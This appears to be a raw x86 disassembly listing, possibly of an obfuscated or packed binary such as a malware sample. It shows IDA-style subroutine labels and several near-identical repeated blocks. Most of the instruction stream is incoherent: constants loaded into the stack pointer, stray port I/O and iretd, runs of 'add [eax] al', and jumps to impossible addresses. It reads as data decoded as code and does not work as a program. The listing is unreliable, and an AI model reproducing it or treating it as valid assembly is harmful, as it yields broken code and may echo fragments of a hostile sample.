pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
jae r-xdata
je 0xffffffffff6da893
jge r-xdata
les ecx [ eax ]
add [ eax ] al
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x5866199b
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a7e75
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jae r-xdata
call 0xffffffff854f7eaf
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95c150
jo 0xffffffffa2c13363
push ecx
push edx
call sub_402448
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c157a5
push edx
call sub_4023e4
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_40245f
jo 0xff99a4c
jo 0xffffffff894f7e89
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_402422
and edi 0x850fc67f
pop ecx
pop eax
ja r-xdata
push ebp
pushfd
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
insd
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
push esp
push eax
call sub_4024c8
xor edi 0x5f795958
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53a9d3
push esp
pushfd
push ecx
sub esp 0xc
call sub_402445
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
sub_4021bb
ja r-xdata
jno r-xdata
jl 0x2f28be1c
jno r-xdata
jl 0xfffffffff6c1df7f
add [ eax ] al
add [ edx + 0x7504c483 ] bh
pop edx
pop edx
jns 0xffffffff814ffe2a
ja r-xdata
jae r-xdata
xor ecx 0xc18d0f
add [ eax ] al
sub esi 0x73bd047f
push ebp
jne r-xdata
jge r-xdata
jmp [ 0xffffffff8964ba73 ]
sub [ esp + 0x58 ] 0x2
sub esp 0x14
pop ecx
jne r-xdata
je 0xffffffffffa3a8f0
pop eax
jne r-xdata
xor edi 0x9b810f
add [ eax ] al
jg r-xdata
xor ecx 0xff70810f
jae r-xdata
ja 0xffffffff89a45e55
jno r-xdata
mov ebx 0xf04c483
ja r-xdata
call 0xffc9a8e
cmp [ edi + 0x7f ] 0x81

ja r-xdata
or ebx 0xff6e8f0f
jns r-xdata
mov [ fs : edi ] ecx
or esp 0x0
add [ eax ] al
pop eax
ja r-xdata
xor edx 0x880f5e7f
add [ eax ] al
jns r-xdata
mov edi 0x9c555757
ja r-xdata
xor ebx 0xff3d870f
ja r-xdata
jg r-xdata
mov ebp 0xf5d7d58
cmp [ ebp + 0x36 ] 0x3d77870f
jne r-xdata
add edi 0xad850f58
add [ eax ] al
add al ch
jne r-xdata
sub edi 0x64244481
xchg ebp eax
sub [ eax ] al
add esp 0x4
ja r-xdata
jl 0xffffffffffacb21c
jae r-xdata
ja 0xffffffffa3c331b4
jae r-xdata
xor ebx 0xff728f0f
jae r-xdata
jmp 0xffffffffff79a2b2
ja r-xdata
jge 0x71fc60f7
jg r-xdata
xor esi 0x25ffca77
jg r-xdata
jo 0xffffffffcbc1a0b9
jg r-xdata
jpo 0xdea79a
pop eax
pop ecx
jne r-xdata
mov [ fs : edi ] ecx
test [ eax - 0x47000000 ] edi
jne r-xdata
jge r-xdata
add esi 0x83575554
in al dx
add al 0xe8
jae r-xdata
sub ecx 0xfeea830f
add [ eax ] al
add [ edi ] cl
test [ edi + 0x75 ] bh
jg r-xdata
and ebx 0xff5a870f
jg r-xdata
add eax 0x5abb2979
jno r-xdata
mov [ fs : edx + 0x5a ] ebx
add [ ecx + 0x42850fe2 ] 0xffffffff
jg r-xdata
add ecx 0xaa890f
add [ eax ] al
jns r-xdata
mov ebp 0x79055573
sub [ ebx - 0x7ed288a6 ] edi
push ebp
pushfd
push esp
push esp
call [ 0xffffffffe9816c73 ]
add [ eax ] al
ja r-xdata
sub ebx 0xec835656
adc al ch
jpe r-xdata
push esi
call sub_402589
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
jg r-xdata
sub edi 0xf681b871
jne r-xdata
add esp 0x8
jne r-xdata
add ebx 0xab810f
add [ eax ] al
xor al [ ecx ]
add [ eax ] al
jae r-xdata
or edx 0xf0c775a
xor [ ebx + 0x3e ] 0x5a59ef81
jne r-xdata
jg r-xdata
or eax 0x97e8569c
add [ eax ] al
add [ ecx - 0x5b70f015 ] al
add [ eax ] al
add [ ecx + 0xc775aca ] al
jno 0xffffffffefc15fde
jno r-xdata
sub esi 0x89641f79
ja r-xdata
jge r-xdata
call [ 0xffffffffca81677d ]
jns r-xdata
test [ edi ] 0x9b81
add [ edi ] cl
mov ebx 0x812d775a
loope r-xdata
ja r-xdata
and ebx 0xe381c67f
jne r-xdata
pop ecx
pop ecx
jne r-xdata
jo 0x7ff92c12
pop ecx
jno r-xdata
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
push edx
push esp
push edx
call sub_40221b
sub ecx 0x850f5959
das
mov edi 0xff188d0f
jae r-xdata
and esi 0x89641273
jae r-xdata
mov ebp 0x478f0f5a
pushfd
push esi
call sub_4021ef
sub ebx 0xa48f0f
add [ eax ] al
sub [ ecx + 0x1 ] 0x0
add [ edi ] cl
adc [ edi + edx * 2 + 0x56 ] 0x55
call sub_402309
add esi 0xa6830f
add [ eax ] al
mov esp 0x58246c83
add al [ ebx + 0xf5914ec ]
test esp ebx
add [ eax ] al
add [ ebx + 0xf04c483 ] bh
add esp 0x4
jne r-xdata
mov eax [ fs : 0xff37958 ]
test [ ebx - 0x1e ] esi
jae r-xdata
call [ 0xffffffffc181727f ]
push ecx
push edx
push ebp
sub esp 0x4
call sub_4021bb
xor ebx 0x15ff4e7f
mov edx 0xff47830f
jno r-xdata
mov esi 0x83555251
in al dx
add al 0xe8
sti
add [ eax ] al
add [ ecx - 0xb1800d ] al
adc eax 0xc181727f
jge r-xdata
mov [ fs : edi - 0x21 ] esi
jg r-xdata
les eax [ edi + ecx ]
jae r-xdata
js 0x7548e7ce
jg r-xdata
ja 0xcaa5ca
pop ecx
pop ecx
jns r-xdata
add edx 0xc1870f58
sub eax 0x6c7315ff
pop ecx
jno r-xdata
call 0xf44e9fd
and [ ecx - 0x2 ] 0xffffffff
inc [ ecx - 0x1b72f03e ]
pop eax
pop eax
pop edx
jne r-xdata
call 0xf48e6d4
lea eax [ ecx + 0x1 ]
add [ eax ] al
jg r-xdata
ja 0xffffffffff9ba471
jae r-xdata
add edx 0xff108f0f
call sub_40216b
and ecx 0x6c870f59
push edi
push edi
push ebp
pushfd
add eax 0xde810f
add [ eax ] al
rol [ ecx + 0x108f0fc2 ] 0xff
push ebp
pushfd
call sub_4021f8
mov edx 0x7504c483
mov esp 0xe2818371
jne r-xdata
or edx 0xf3812e79
pop edx
jge r-xdata
jo 0xffffffff854f7cc3
pop eax
jae r-xdata
and esi 0xc2817577
ja r-xdata
xor ecx 0x30870f59
add [ eax ] eax
add [ edi ] cl
xor [ ebx + 0x7a ] 0xffffffe8
add esp 0x8
or bh [ ebp + 0x478f0f5a ]
jno r-xdata
js 0x7f44e789
add [ eax ] al
dec ecx
pop ecx
jne r-xdata
jbe 0xffcf4c8
jae r-xdata
call sub_402380
jb 0xffffffff81b2a036
or edx 0x54549c55
jno r-xdata
and ebx 0x870f4975
ja r-xdata
pop edx
mov eax 0xff55870f
pop eax
jge r-xdata
jge 0xffffffffffa2a4a4
pop edx
jg r-xdata
and [ edx + 0xf000000 ] 0xffffff8d
and ecx 0xf04c483
add esp 0x4
jg r-xdata
je 0xffffffff804f97e4
jge r-xdata
add edx 0xbf810f
add [ eax ] al
jno r-xdata
call [ 0xfbf3f7f ]
lea ebx [ eax ]
sbb [ edi ] ecx
mov [ edi ] cs
jno r-xdata
jge 0xffffffffffa0a807
jne r-xdata
mov [ fs : ebp + 0x19 ] esi
jae r-xdata
xor esi 0xe681cd75
pop ecx
jns r-xdata
jno 0xffffffff874f5757
jae r-xdata
and edx 0xff53830f
pop edx
pop edx
jne r-xdata
jne r-xdata
mov eax 0xfeef890f
jns r-xdata
sub eax 0x755a5858
mov ah 0x81
0x9c55
jge r-xdata
jpe 0x74cd340b
add esp 0x4
jae r-xdata
jl 0xf3a54c
pop ecx
jno r-xdata
mov ecx 0x15ff2d7f
jae r-xdata
or ecx 0xf18d0f
add [ eax ] al
push esp
push ebp
push edi
sub esp 0x4
call sub_402226
jae 0xffffffffff43aa4b
xor ecx 0x890fd079
or esi 0xff24810f
ja r-xdata
and eax 0x4c48358
pop eax
jg r-xdata
jge 0xffffffff894f7c45
jae r-xdata
sub ecx 0x92810f59
add [ eax ] al
add [ ecx - 0x7e39801d ] al
jecxz r-xdata
jns r-xdata
sub ebx 0xe8525452
insb
push eax
pushfd
add ebx 0xdc7f585a
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
ja r-xdata
jno 0xffffffffe89176e2
push 0x81ffffff
out 0x77 al
jne r-xdata
sub esp 0x28
pop ecx
pop edx
jne r-xdata
add [ esp + 0x64 ] r-xdata
sub ebx 0xff2f850f
jns 0x158a7a6
push edi
call sub_402478
jg 0xfffffffff0b37e9f
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
jno r-xdata
add esp 0x4
pop eax
jge r-xdata
jbe 0x133b322
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
pop ecx
ja r-xdata
xor eax 0xfef4870f
cmp edi 0xffffffff
inc [ ecx + 0x1a830ff3 ]
out dx eax
retn 0x810f
add [ eax ] al
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x5866199b
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a7e75
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jno r-xdata
jae 0xffffffff84289cc1
jae r-xdata
call 0xffffffff854f7eaf
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95c150
jo 0xffffffffa2c13363
push ecx
push edx
call sub_402448
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c157a5
push edx
call sub_4023e4
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_40245f
jo 0xff99a4c
jo 0xffffffff894f7e89
jae r-xdata
je 0xffffffffff6da893
jge r-xdata
les ecx [ eax ]
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_402422
and edi 0x850fc67f
pop ecx
pop eax
ja r-xdata
push ebp
pushfd
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
insd
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
push esp
push eax
call sub_4024c8
xor edi 0x5f795958
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53a9d3
push esp
pushfd
push ecx
sub esp 0xc
call sub_402445
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
sub_4021ef
pop ecx
ja r-xdata
pop edx
ja r-xdata
jae 0xffffffff81ce9754
pop eax
jns r-xdata
jno 0xffffffffefc15fde
out dx eax
jae r-xdata
jne 0xffffffffe3c203ed
push ecx
push edx
push ebp
sub esp 0x4
call sub_4021bb
xor ebx 0x15ff4e7f
mov edx 0xff47830f
jg r-xdata
sub edi 0x5c755a59
ja r-xdata
jg r-xdata
add ecx 0xaa890f
add [ eax ] al
jno r-xdata
jno 0xfffffffff1c1ab24
ja r-xdata
jge 0x71fc60f7
jge r-xdata
call [ 0xffffffffca81677d ]
jae r-xdata
xor ecx 0xc18d0f
add [ eax ] al
sub esi 0x73bd047f
push ebp
ja r-xdata
and edx 0xff42850f
jno r-xdata
jno r-xdata
mov [ fs : edx + 0x5a ] ebx
add [ ecx + 0x42850fe2 ] 0xffffffff
jno r-xdata
mov esi 0x83555251
in al dx
add al 0xe8
sti
add [ eax ] al
add [ ecx - 0xb1800d ] al
adc eax 0xc181727f
jae r-xdata
xor ebx 0xff728f0f
sub [ esp + 0x58 ] 0x2
sub esp 0x14
pop ecx
jne r-xdata
je 0xffffffffffa3a8f0
pop eax
jne r-xdata
xor edi 0x9b810f
add [ eax ] al
jl 0xfffffffff6c1df7f
jge r-xdata
jmp [ 0xffffffff8964ba73 ]
ja r-xdata
jmp [ 0xfffffffff381df77 ]
jno r-xdata
sub esi 0x89641f79
push ebp
pushfd
call sub_4021f8
mov edx 0x7504c483
rol [ ecx + 0x108f0fc2 ] 0xff
mov esp 0xe2818371
jne r-xdata
mov ebp 0xf5d7d58
cmp [ ebp + 0x36 ] 0x3d77870f
jg r-xdata
and ebx 0xff5a870f
jno r-xdata
mov ebx 0xf04c483
ja r-xdata
call 0xffc9a8e
cmp [ edi + 0x7f ] 0x81

jae r-xdata
ja 0xffffffff89a45e55
jne r-xdata
add edi 0xad850f58
add [ eax ] al
add al ch
pop eax
jge r-xdata
jge 0xffffffffffa2a4a4
jae r-xdata
or edx 0xf0c775a
xor [ ebx + 0x3e ] 0x5a59ef81
jne r-xdata
pop eax
ja r-xdata
xor edx 0x880f5e7f
add [ eax ] al
jns r-xdata
mov edi 0x9c555757
jns r-xdata
mov [ fs : edi ] ecx
or esp 0x0
add [ eax ] al
jg r-xdata
pop edx
pop edx
jg r-xdata
xor esi 0x25ffca77
jg r-xdata
jo 0xffffffffcbc1a0b9
pop ecx
jns r-xdata
jno 0xffffffff874f5757
pushfd
push esi
call sub_4021ef
sub ebx 0xa48f0f
add [ eax ] al
sub [ ecx + 0x1 ] 0x0
add [ edi ] cl
adc [ edi + edx * 2 + 0x56 ] 0x55
call sub_402309
add esi 0xa6830f
add [ eax ] al
mov esp 0x58246c83
add al [ ebx + 0xf5914ec ]
test esp ebx
add [ eax ] al
add [ ebx + 0xf04c483 ] bh
add esp 0x4
jne r-xdata
mov eax [ fs : 0xff37958 ]
test [ ebx - 0x1e ] esi
jne r-xdata
sub edi 0x64244481
xchg ebp eax
sub [ eax ] al
add esp 0x4
ja r-xdata
jl 0xffffffffffacb21c
jae r-xdata
ja 0xffffffffa3c331b4
jns r-xdata
mov ebp 0x79055573
sub [ ebx - 0x7ed288a6 ] edi
jae r-xdata
add edx 0xff108f0f
jg r-xdata
jpo 0xdea79a
pop eax
pop ecx
jne r-xdata
mov [ fs : edi ] ecx
test [ eax - 0x47000000 ] edi
jne r-xdata
jge r-xdata
add esi 0x83575554
in al dx
add al 0xe8
jae r-xdata
sub ecx 0xfeea830f
add [ eax ] al
add [ edi ] cl
test [ edi + 0x75 ] bh
jns r-xdata
test [ edi ] 0x9b81
add [ edi ] cl
mov ebx 0x812d775a
ja r-xdata
pop edx
mov eax 0xff55870f
push ebp
pushfd
push esp
push esp
call [ 0xffffffffe9816c73 ]
add [ eax ] al
ja r-xdata
sub ebx 0xec835656
adc al ch
jpe r-xdata
push esi
call sub_402589
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
jg r-xdata
sub edi 0xf681b871
jne r-xdata
add esp 0x8
jne r-xdata
add ebx 0xab810f
add [ eax ] al
xor al [ ecx ]
add [ eax ] al
jge r-xdata
mov [ fs : edi - 0x21 ] esi
loope r-xdata
ja r-xdata
and ebx 0xe381c67f
jne r-xdata
pop ecx
pop ecx
jne r-xdata
jo 0x7ff92c12
pop ecx
jno r-xdata
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
push edx
push esp
push edx
call sub_40221b
sub ecx 0x850f5959
das
mov edi 0xff188d0f
jae r-xdata
and esi 0x89641273
jae r-xdata
mov ebp 0x478f0f5a
jne r-xdata
or edx 0xf3812e79
jg r-xdata
les eax [ edi + ecx ]
jae r-xdata
js 0x7548e7ce
jg r-xdata
ja 0xcaa5ca
pop ecx
pop ecx
jns r-xdata
add edx 0xc1870f58
sub eax 0x6c7315ff
pop ecx
jno r-xdata
call 0xf44e9fd
and [ ecx - 0x2 ] 0xffffffff
inc [ ecx - 0x1b72f03e ]
pop eax
pop eax
pop edx
jne r-xdata
call 0xf48e6d4
lea eax [ ecx + 0x1 ]
add [ eax ] al
jg r-xdata
ja 0xffffffffff9ba471
jg r-xdata
xor ecx 0xff70810f
jg r-xdata
or eax 0x97e8569c
add [ eax ] al
add [ ecx - 0x5b70f015 ] al
add [ eax ] al
add [ ecx + 0xc775aca ] al
pop edx
jge r-xdata
jo 0xffffffff854f7cc3
pop eax
jae r-xdata
and esi 0xc2817577
ja r-xdata
xor ecx 0x30870f59
add [ eax ] eax
add [ edi ] cl
xor [ ebx + 0x7a ] 0xffffffe8
add esp 0x8
or bh [ ebp + 0x478f0f5a ]
jno r-xdata
js 0x7f44e789
add [ eax ] al
dec ecx
pop ecx
jne r-xdata
jbe 0xffcf4c8
jae r-xdata
call sub_402380
jb 0xffffffff81b2a036
or edx 0x54549c55
jno r-xdata
and ebx 0x870f4975
ja r-xdata
or ebx 0xff6e8f0f
jae r-xdata
call [ 0xffffffffc181727f ]
pop edx
jg r-xdata
and [ edx + 0xf000000 ] 0xffffff8d
and ecx 0xf04c483
add esp 0x4
jg r-xdata
je 0xffffffff804f97e4
jge r-xdata
add edx 0xbf810f
add [ eax ] al
jno r-xdata
call [ 0xfbf3f7f ]
lea ebx [ eax ]
sbb [ edi ] ecx
mov [ edi ] cs
jno r-xdata
jge 0xffffffffffa0a807
jne r-xdata
mov [ fs : ebp + 0x19 ] esi
jae r-xdata
xor esi 0xe681cd75
ja r-xdata
xor ebx 0xff3d870f
call sub_40216b
and ecx 0x6c870f59
push edi
push edi
push ebp
pushfd
add eax 0xde810f
add [ eax ] al
jae r-xdata
and edx 0xff53830f
pop edx
pop edx
jne r-xdata
jne r-xdata
mov eax 0xfeef890f
jns r-xdata
sub eax 0x755a5858
mov ah 0x81
0x9c55
jge r-xdata
jpe 0x74cd340b
add esp 0x4
jae r-xdata
jl 0xf3a54c
jae r-xdata
jmp 0xffffffffff79a2b2
pop ecx
jno r-xdata
mov ecx 0x15ff2d7f
jae r-xdata
or ecx 0xf18d0f
add [ eax ] al
push esp
push ebp
push edi
sub esp 0x4
call sub_402226
jae 0xffffffffff43aa4b
xor ecx 0x890fd079
or esi 0xff24810f
ja r-xdata
and eax 0x4c48358
pop eax
jg r-xdata
jge 0xffffffff894f7c45
jg r-xdata
add eax 0x5abb2979
jae r-xdata
sub ecx 0x92810f59
add [ eax ] al
add [ ecx - 0x7e39801d ] al
jecxz r-xdata
jns r-xdata
sub ebx 0xe8525452
insb
push eax
pushfd
add ebx 0xdc7f585a
pop ecx
jno r-xdata
and edi 0x800fae73
pop eax
pop ecx
jns r-xdata
ja r-xdata
jno 0xffffffffe89176e2
push 0x81ffffff
out 0x77 al
jne r-xdata
sub esp 0x28
pop ecx
pop edx
jne r-xdata
add [ esp + 0x64 ] r-xdata
sub ebx 0xff2f850f
jns 0x158a7a6
push edi
call sub_402478
jg 0xfffffffff0b37e9f
add edx 0xc381ea77
pop edx
pop eax
jg r-xdata
jno r-xdata
add esp 0x4
pop eax
jge r-xdata
jbe 0x133b322
pop edx
jg r-xdata
mov [ fs : 0x15ffe47d ] eax
pop ecx
ja r-xdata
xor eax 0xfef4870f
cmp edi 0xffffffff
inc [ ecx + 0x1a830ff3 ]
out dx eax
retn 0x810f
add [ eax ] al
add eax 0x4c4835a
jae r-xdata
jae r-xdata
jo 0x5866199b
ja r-xdata
add edi 0xff74830f
add [ eax ] al
jno 0xf9a7e75
jae r-xdata
mov [ fs : 0xffffffff8a0f6d71 ] eax
jno r-xdata
jae 0xffffffff84289cc1
jae r-xdata
call 0xffffffff854f7eaf
xor al 0xff
pop ecx
ja r-xdata
jge 0xffffffff9c95c150
jo 0xffffffffa2c13363
push ecx
push edx
call sub_402448
and edx 0x185e856
add [ eax ] al
jl 0xffffffffc1c157a5
push edx
call sub_4023e4
and esi 0xe981dd73
pushfd
push edi
pushfd
call sub_40245f
jo 0xff99a4c
jo 0xffffffff894f7e89
jae r-xdata
je 0xffffffffff6da893
jge r-xdata
les ecx [ eax ]
jge r-xdata
add ecx 0x870f5859
inc edi
add [ eax ] eax
add [ ecx - 0x7ef0a60a ] al
lodsb [ esi ]
pop edx
jne r-xdata
mov eax [ fs : 0xffffffffc9812675 ]
push esi
call sub_402422
and edi 0x850fc67f
pop ecx
pop eax
ja r-xdata
push ebp
pushfd
lea ecx [ edi ]
and [ eax - 0x1 ] 0xffffffff
dec [ edi ]
lea edx [ eax - 0x64 ]
insd
jne r-xdata
and edx 0x83519c54
in al dx
or al 0xe8
iretd
jae r-xdata
mov ebp 0x64f37759
mov eax [ 0xffffffffc9812675 ]
xor ecx 0x4ce85251
add [ eax ] al
add [ ecx - 0x7a17a91e ] al
add [ eax ] eax
add [ edi ] cl
sbb [ ecx + 0xf ] 0x81
mov [ 0xf000000 ] al
push esp
push eax
call sub_4024c8
xor edi 0x5f795958
jge r-xdata
add [ eax ] al
add [ edi ] cl
xchg [ edi - 0x30 ] bh
mov esp 0x11b8f0f
add [ eax ] al
sub ecx 0x8199755a
neg [ eax + 0x59 ]
jns r-xdata
xor esi 0xac810f59
jg 0xffffffffff53a9d3
push esp
pushfd
push ecx
sub esp 0xc
call sub_402445
mov [ fs : 0xffffffff870f5a59 ] eax
lodsd [ esi ]
add [ eax ] al
add [ esi + 0x790cc483 ] bh
iretd
or edi 0x80c481
add [ eax ] al
retn
sub_4021f8
pop eax
jne r-xdata
jne r-xdata
sub edi 0xfeb2810f
pop eax
jge r-xdata
jge 0xffffffffffa2a4a4
pop ecx
jns r-xdata
jno 0xffffffff874f5757
jg r-xdata
jo 0xffffffffcbc1a0b9
ja r-xdata
jns r-xdata
mov ebp 0x79055573
sub [ ebx - 0x7ed288a6 ] edi
jg r-xdata
jno r-xdata
mov [ fs : edx + 0x5a ] ebx
jns r-xdata
test [ edi ] 0x9b81
add [ edi ] cl
mov ebx 0x812d775a
jge r-xdata
call [ 0xffffffffca81677d ]
jno r-xdata
sub esi 0x89641f79
ja r-xdata
jae r-xdata
xor ecx 0xc18d0f
add [ eax ] al
sub esi 0x73bd047f
push ebp
jge r-xdata
mov [ fs : edi - 0x21 ] esi
jno r-xdata
mov esi 0x83555251
in al dx
add al 0xe8
sti
add [ eax ] al
add [ ecx - 0xb1800d ] al
adc eax 0xc181727f
jae r-xdata
xor ebx 0xff728f0f
push ecx
push edx
push ebp
sub esp 0x4
call sub_4021bb
xor ebx 0x15ff4e7f
mov edx 0xff47830f
jne r-xdata
add edi 0xad850f58
add [ eax ] al
add al ch
sub [ esp + 0x58 ] 0x2
sub esp 0x14
pop ecx
jne r-xdata
je 0xffffffffffa3a8f0
pop eax
jne r-xdata
xor edi 0x9b810f
add [ eax ] al
jl 0xfffffffff6c1df7f
jne r-xdata
or edx 0xf3812e79
push ebp
pushfd
call sub_4021f8
mov edx 0x7504c483
rol [ ecx + 0x108f0fc2 ] 0xff
mov esp 0xe2818371
ja r-xdata
mov ebp 0xf5d7d58
cmp [ ebp + 0x36 ] 0x3d77870f
jg r-xdata
and ebx 0xff5a870f
add ecx 0xaa890f
add [ eax ] al
jg r-xdata
xor esi 0x25ffca77
jno r-xdata
mov ebx 0xf04c483
ja r-xdata
call 0xffc9a8e
cmp [ edi + 0x7f ] 0x81

ja r-xdata
jg r-xdata
xor ecx 0xff70810f
jg r-xdata
or eax 0x97e8569c
add [ eax ] al
add [ ecx - 0x5b70f015 ] al
add [ eax ] al
add [ ecx + 0xc775aca ] al
jno 0xffffffffefc15fde
jge 0x71fc60f7
jae r-xdata
or edx 0xf0c775a
xor [ ebx + 0x3e ] 0x5a59ef81
jne r-xdata
jns r-xdata
mov [ fs : edi ] ecx
or esp 0x0
add [ eax ] al
pop eax
ja r-xdata
xor edx 0x880f5e7f
add [ eax ] al
jns r-xdata
mov edi 0x9c555757
jge r-xdata
jmp [ 0xffffffff8964ba73 ]
ja r-xdata
or ebx 0xff6e8f0f
jae r-xdata
call [ 0xffffffffc181727f ]
add [ ecx + 0x42850fe2 ] 0xffffffff
pushfd
push esi
call sub_4021ef
sub ebx 0xa48f0f
add [ eax ] al
sub [ ecx + 0x1 ] 0x0
add [ edi ] cl
adc [ edi + edx * 2 + 0x56 ] 0x55
call sub_402309
add esi 0xa6830f
add [ eax ] al
mov esp 0x58246c83
add al [ ebx + 0xf5914ec ]
test esp ebx
add [ eax ] al
add [ ebx + 0xf04c483 ] bh
add esp 0x4
jne r-xdata
mov eax [ fs : 0xff37958 ]
test [ ebx - 0x1e ] esi
jne r-xdata
sub edi 0x64244481
xchg ebp eax
sub [ eax ] al
add esp 0x4
ja r-xdata
jl 0xffffffffffacb21c
jae r-xdata
ja 0xffffffffa3c331b4
jae r-xdata
ja 0xffffffff89a45e55
ja r-xdata
xor ebx 0xff3d870f
call sub_40216b
and ecx 0x6c870f59
push edi
push edi
push ebp
pushfd
add eax 0xde810f
add [ eax ] al
jae r-xdata
add edx 0xff108f0f
jg r-xdata
jpo 0xdea79a
pop eax
pop ecx
jne r-xdata
mov [ fs : edi ] ecx
test [ eax - 0x47000000 ] edi
jne r-xdata
jge r-xdata
add esi 0x83575554
in al dx
add al 0xe8
jae r-xdata
sub ecx 0xfeea830f
add [ eax ] al
add [ edi ] cl
test [ edi + 0x75 ] bh
jg r-xdata
pop edx
pop edx
jae r-xdata
jmp 0xffffffffff79a2b2
ja r-xdata
pop edx
mov eax 0xff55870f
push ebp
pushfd
push esp
push esp
call [ 0xffffffffe9816c73 ]
add [ eax ] al
ja r-xdata
sub ebx 0xec835656
adc al ch
jpe r-xdata
push esi
call sub_402589
xor esi 0x72870f59
add [ eax ] eax
add [ esp + edx * 2 + 0xd5e850 ] bh
add [ eax ] al
jg r-xdata
sub edi 0xf681b871
jne r-xdata
add esp 0x8
jne r-xdata
add ebx 0xab810f
add [ eax ] al
xor al [ ecx ]
add [ eax ] al
jg r-xdata
add eax 0x5abb2979
loope r-xdata
ja r-xdata
and ebx 0xe381c67f
jne r-xdata
pop ecx
pop ecx
jne r-xdata
jo 0x7ff92c12
pop ecx
jno r-xdata
sub esi 0xf58595a
sub [ edi - 0x1 ] 0xffffffff
inc [ ecx - 0x70f0a53a ]
add [ eax ] 0x0
add [ ebx + 0x71 ] ah
insd
xchg [ edi ] cl
add [ eax ] al
add [ edi ] cl
push edx
push esp
push edx
call sub_40221b
sub ecx 0x850f5959
das
mov edi 0xff188d0f
jae r-xdata
and esi 0x89641273
jae r-xdata
mov ebp 0x478f0f5a
jg r-xdata
les eax [ edi + ecx ]
jae r-xdata
js 0x7548e7ce
jg r-xdata
ja 0xcaa5ca
pop ecx
pop ecx
jns r-xdata
add edx 0xc1870f58
sub eax 0x6c7315ff
pop ecx
jno r-xdata
call 0xf44e9fd
and [ ecx - 0x2 ] 0xffffffff
inc [ ecx - 0x1b72f03e ]
pop eax
pop eax
pop edx
jne r-xdata
call 0xf48e6d4
lea eax [ ecx + 0x1 ]
add [ eax ] al
jg r-xdata
ja 0xffffffffff9ba471
pop edx
jge r-xdata
jo 0xffffffff854f7cc3
pop eax
jae r-xdata
and esi 0xc2817577
ja r-xdata
xor ecx 0x30870f59
add [ eax ] eax
add [ edi ] cl
xor [ ebx + 0x7a ] 0xffffffe8
add esp 0x8
or bh [ ebp + 0x478f0f5a ]
jno r-xdata
js 0x7f44e789
add [ eax ] al
dec ecx
pop ecx
jne r-xdata
jbe 0xffcf4c8
jae r-xdata
call sub_402380
jb 0xffffffff81b2a036
or edx 0x54549c55
jno r-xdata
and ebx 0x870f4975
pop edx
jg r-xdata
and [ edx + 0xf000000 ] 0xffffff8d
and ecx 0xf04c483
add esp 0x4
jg r-xdata
je 0xffffffff804f97e4
jge r-xdata
add edx 0xbf810f
add [ eax ] al
jno r-xdata
call [ 0xfbf3f7f ]
lea ebx [ eax ]
sbb [ edi ] ecx
mov [ edi ] cs
jno r-xdata
jge 0xffffffffffa0a807
jne r-xdata
mov [ fs : ebp + 0x19 ] esi
jae r-xdata
xor esi 0xe681cd75
jae r-xdata
and edx 0xff53830f
pop edx
pop edx
